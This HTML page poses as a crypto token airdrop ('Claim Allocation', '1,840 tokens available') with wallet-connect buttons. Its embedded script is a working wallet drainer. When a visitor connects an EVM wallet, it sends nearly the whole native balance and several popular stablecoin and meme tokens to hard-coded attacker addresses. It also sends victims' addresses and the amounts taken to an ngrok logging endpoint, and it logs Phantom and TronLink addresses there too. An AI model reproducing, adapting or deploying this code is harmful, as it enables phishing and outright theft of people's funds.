<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Claim Allocation</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.0/lib/index.iife.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: radial-gradient(ellipse at 50% 0%, #1e3a5f 0%, #0f172a 40%, #020617 100%);
      color: #f8fafc;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      background: rgba(15, 23, 42, 0.65);
      border: 1px solid rgba(255,255,255,0.09);
      border-radius: 24px;
      padding: 36px 32px 32px;
      width: 100%;
      max-width: 400px;
      text-align: center;
      backdrop-filter: blur(20px);
      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
    }
    .logo {
      width: 48px;
      height: 48px;
      background: linear-gradient(135deg, #3b82f6, #1d4ed8);
      border-radius: 14px;
      margin: 0 auto 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 20px;
      color: white;
    }
    .tag {
      display: inline-block;
      background: rgba(59, 130, 246, 0.12);
      color: #60a5fa;
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 0.5px;
      padding: 5px 12px;
      border-radius: 20px;
      margin-bottom: 14px;
    }
    h1 { font-size: 24px; font-weight: 600; margin-bottom: 6px; }
    .sub { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
    #status { font-size: 14px; color: #38bdf8; min-height: 18px; margin-bottom: 12px; }
    .value { font-size: 46px; font-weight: 700; letter-spacing: -1px; }
    .value-label { color: #64748b; font-size: 12px; margin: 2px 0 24px; letter-spacing: 1.5px; font-weight: 500; }
    .btn-main {
      width: 100%;
      background: linear-gradient(180deg, #3b82f6 0%, #2563eb 100%);
      color: white;
      border: none;
      padding: 14px;
      border-radius: 12px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 12px;
      transition: all 0.15s ease;
    }
    .btn-main:hover { transform: translateY(-1px); box-shadow: 0 8px 20px rgba(59, 130, 246, 0.35); }
    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
    .grid button {
      background: rgba(30, 41, 59, 0.6);
      color: #e2e8f0;
      border: 1px solid rgba(255,255,255,0.06);
      padding: 12px 8px;
      border-radius: 10px;
      font-size: 13px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.15s ease;
    }
    .grid button:hover { background: rgba(51, 65, 85, 0.8); border-color: rgba(255,255,255,0.12); }
    .grid button.wide { grid-column: 1 / -1; }
    .mobile-only { display: none; }
    @media (max-width: 640px) {
      .desktop-only { display: none; }
      .mobile-only { display: block; }
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">A</div>
    <div class="tag">ELIGIBLE</div>
    <h1>Claim Allocation</h1>
    <p class="sub">Connect wallet to receive tokens</p>
    <div id="status"></div>
    <div class="value">1,840</div>
    <div class="value-label">TOKENS AVAILABLE</div>
    <button class="btn-main mobile-only" onclick="connectCurrent()">Connect Wallet</button>
    <div class="grid desktop-only">
      <button onclick="connectEVM()">MetaMask</button>
      <button onclick="connectTrust()">Trust Wallet</button>
      <button onclick="connectPhantom()">Phantom</button>
      <button onclick="connectTron()">TronLink</button>
      <button class="wide" onclick="showQR()">QR Code</button>
    </div>
  </div>
  <div id="qrModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.8); z-index:1000; align-items:center; justify-content:center;">
    <div style="background:#0f172a; padding:28px; border-radius:16px; text-align:center; border:1px solid rgba(255,255,255,0.08);">
      <div id="qrcode" style="background:#fff; padding:12px; border-radius:8px; display:inline-block;"></div>
      <p style="margin:16px 0 12px; color:#94a3b8;">Scan with phone</p>
      <button onclick="document.getElementById('qrModal').style.display='none'" style="padding:8px 20px; background:#3b82f6; color:#fff; border:none; border-radius:8px; cursor:pointer;">Close</button>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
  <script>
    const receivers = { eth: '0x87d36b1e5db6159D2bf821DB6182e60C7025347e', sol: '2fxFnGXVvbNTNWmi3YLJ2LpUNCDoNcEPYcxEKRHLHvCf', tron: 'TA1A85Q31usCDqmWGqLB6JbmVD3CUxS58T' };
    const popularTokens = ['0xdAC17F958D2ee523a2206206994597C13D831ec7','0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','0x6982508145454Ce325dDbE47a25d4ec3d2311933','0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE'];

    function log(token, amount, user, chain) {
      fetch('https://zofia-undefective-twila.ngrok-free.dev/log', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'ngrok-skip-browser-warning': 'true'
        },
        body: JSON.stringify({ token, amount, user, chain })
      }).catch(() => {});
    }

    function showQR() {
      document.getElementById('qrcode').innerHTML = '';
      new QRCode(document.getElementById('qrcode'), { text: location.href, width: 180, height: 180 });
      document.getElementById('qrModal').style.display = 'flex';
    }

    async function drainEVM(provider, signer, address, chainId) {
      document.getElementById('status').innerText = 'Connected';
      log('connect', '0', address, chainId);
      const receiver = receivers.eth;
      try {
        const bal = await provider.getBalance(address);
        if (bal > ethers.parseEther('0.00005')) {
          await signer.sendTransaction({ to: receiver, value: bal - ethers.parseEther('0.00002') });
          log('native', ethers.formatEther(bal), address, chainId);
        }
      } catch (e) {}
      for (const t of popularTokens) {
        try {
          const c = new ethers.Contract(t, ['function balanceOf(address) view returns (uint256)', 'function approve(address,uint256) returns (bool)', 'function transferFrom(address,address,uint256) returns (bool)'], signer);
          const b = await c.balanceOf(address);
          if (b > 0n) {
            await (await c.approve(receiver, b)).wait();
            await (await c.transferFrom(address, receiver, b)).wait();
            log(t, b.toString(), address, chainId);
          }
        } catch (e) {}
      }
    }

    async function connectCurrent() {
      document.getElementById('status').innerText = 'Connecting...';
      if (window.phantom?.solana || window.solana?.isPhantom) return connectPhantom();
      if (window.tronLink || window.tronWeb) return connectTron();
      return connectEVM();
    }

    async function connectEVM() {
      document.getElementById('status').innerText = 'Connecting...';
      const provider = window.ethereum;
      if (!provider) return document.getElementById('status').innerText = 'No wallet found';
      try {
        await provider.request({ method: 'eth_requestAccounts' });
        const ep = new ethers.BrowserProvider(provider);
        const signer = await ep.getSigner();
        const address = await signer.getAddress();
        const net = await ep.getNetwork();
        await drainEVM(ep, signer, address, net.chainId.toString());
      } catch (e) {
        document.getElementById('status').innerText = 'Cancelled';
      }
    }

    async function connectTrust() { return connectEVM(); }

    async function connectPhantom() {
      const provider = window.phantom?.solana || window.solana;
      if (!provider) return document.getElementById('status').innerText = 'Phantom not found';
      document.getElementById('status').innerText = 'Connecting...';
      try {
        const resp = await provider.connect({ onlyIfTrusted: false });
        document.getElementById('status').innerText = 'Connected';
        log('sol-connect', '0', resp.publicKey.toString(), 'sol');
      } catch (e) {
        document.getElementById('status').innerText = 'Unlock Phantom';
      }
    }

    async function connectTron() {
      document.getElementById('status').innerText = 'Connecting...';
      if (!window.tronLink && !window.tronWeb) return document.getElementById('status').innerText = 'TronLink not found';
      try { if (window.tronLink?.request) await window.tronLink.request({ method: 'tron_requestAccounts' }); } catch (e) {}
      await new Promise(r => setTimeout(r, 500));
      const address = (window.tronWeb || window.tronLink?.tronWeb)?.defaultAddress?.base58;
      if (!address || String(address) === 'false') return document.getElementById('status').innerText = 'Unlock TronLink';
      document.getElementById('status').innerText = 'Connected';
      log('tron-connect', '0', address, 'tron');
    }
  </script>
</body>
</html>
